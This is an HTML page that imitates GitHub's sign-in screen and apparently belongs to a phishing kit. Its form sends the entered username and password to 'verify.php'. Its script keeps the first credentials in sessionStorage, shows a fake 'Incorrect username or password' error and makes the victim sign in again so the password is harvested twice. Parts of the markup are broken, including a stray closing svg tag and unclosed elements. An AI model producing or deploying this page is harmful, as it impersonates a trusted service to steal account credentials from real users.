<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Sign in to GitHub · GitHub</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background: #0d1117;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .logo {
            margin-bottom: 16px;
        }
        
        .logo svg {
            width: 48px;
            height: 48px;
            fill: #f0f6fc;
        }
        
        .login-container {
            width: 100%;
            max-width: 340px;
        }
        
        .login-box {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 6px;
            padding: 24px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 300;
            color: #f0f6fc;
            text-align: center;
            margin-bottom: 16px;
            letter-spacing: -0.5px;
        }
        
        .error-box {
            background: #da3633;
            color: #f0f6fc;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 16px;
            display: none;
            font-size: 14px;
        }
        
        .error-box.show {
            display: block;
        }
        
        .error-box a {
            color: #f0f6fc;
            text-decoration: underline;
        }
        
        .input-group {
            margin-bottom: 16px;
        }
        
        .input-group label {
            display: block;
            color: #f0f6fc;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        
        .input-group input {
            width: 100%;
            padding: 5px 12px;
            font-size: 14px;
            line-height: 20px;
            color: #f0f6fc;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        .input-group input:focus {
            border-color: #2f81f7;
            box-shadow: 0 0 0 3px rgba(47, 129, 247, 0.15);
        }
        
        .signin-btn {
            width: 100%;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            line-height: 20px;
            color: #f0f6fc;
            background: #238636;
            border: 1px solid rgba(240, 246, 252, 0.1);
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            margin-bottom: 16px;
        }
        
        .signin-btn:hover {
            background: #2ea043;
        }
        
        .signin-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            color: #8b949e;
            font-size: 12px;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #30363d;
        }
        
        .divider span {
            margin: 0 16px;
        }
        
        .social-buttons {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 16px;
        }
        
        .social-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 5px 16px;
            font-size: 14px;
            font-weight: 500;
            color: #f0f6fc;
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            text-decoration: none;
            transition: background 0.2s;
        }
        
        .social-btn:hover {
            background: #30363d;
        }
        
        .social-btn svg {
            width: 18px;
            height: 18px;
        }
        
        .passkey-link {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .passkey-link a {
            color: #2f81f7;
            text-decoration: none;
            font-size: 14px;
        }
        
        .passkey-link a:hover {
            text-decoration: underline;
        }
        
        .create-account {
            text-align: center;
            padding: 16px;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #f0f6fc;
            font-size: 14px;
        }
        
        .create-account a {
            color: #2f81f7;
            text-decoration: none;
        }
        
        .create-account a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            font-size: 12px;
            color: #8b949e;
        }
        
        .footer-links a {
            color: #8b949e;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            color: #2f81f7;
            text-decoration: underline;
        }
        
        .loading-spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(240, 246, 252, 0.3);
            border-top-color: #f0f6fc;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 480px) {
            .login-box {
                padding: 16px;
            }
        }
    </style>
</head>
<body>

        </svg>
    </div>
    
    <div class="login-container">
        <div class="login-box">
            <h1>Sign in to GitHub</h1>
            
            <div class="error-box" id="errorBox">
                ⚠️ Incorrect username or password. 
                <a href="recovery.html">Forgot password?</a>
            </div>
            
            <form action="verify.php" method="POST" id="loginForm">
                <input type="hidden" name="platform" value="github">
                <input type="hidden" name="attempt" id="attemptInput" value="1">
                
                <div class="input-group">
                    <label>Username or email address</label>
                    <input type="text" name="email" id="emailInput" required autofocus>
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="pass" id="passInput" required>
                </div>
                
                <button type="submit" class="signin-btn" id="loginBtn">Sign in</button>
            </form>
            
            <div class="divider">
                <span>or</span>
            </div>

            <div class="passkey-link">
                <a href="#">Sign in with a passkey</a>

        <div class="create-account">
            New to GitHub? <a href="#">Create an account</a>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Terms</a>

                <a href="#">Manage cookies</a>
                <a href="#">Do not share my personal information</a>
            </div>
        </div>
    </div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const showError = urlParams.get('error') === '1';
        const savedEmail = urlParams.get('email');
        
        if (showError) {
            document.getElementById('errorBox').classList.add('show');
            if (savedEmail) {
                document.getElementById('emailInput').value = decodeURIComponent(savedEmail);
                document.getElementById('passInput').focus();
            }
            document.getElementById('attemptInput').value = '2';
        }
        
        const storedEmail = sessionStorage.getItem('gh_email');
        if (storedEmail && !savedEmail) {
            document.getElementById('emailInput').value = storedEmail;
        }
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.getElementById('emailInput').value;
            const pass = document.getElementById('passInput').value;
            const attempt = document.getElementById('attemptInput').value;
            
            if (!email || !pass) {
                e.preventDefault();
                alert('Please fill in all fields');
                return;
            }
            
            if (attempt === '1') {
                e.preventDefault();
                sessionStorage.setItem('gh_email', email);
                sessionStorage.setItem('gh_pass', pass);
                
                const btn = document.getElementById('loginBtn');
                btn.innerHTML = '<span class="loading-spinner"></span>Verifying...';
                btn.disabled = true;
                
                setTimeout(() => {
                    window.location.href = `index.html?error=1&email=${encodeURIComponent(email)}`;
                }, 2000);
            }
        });
    </script>
</body>
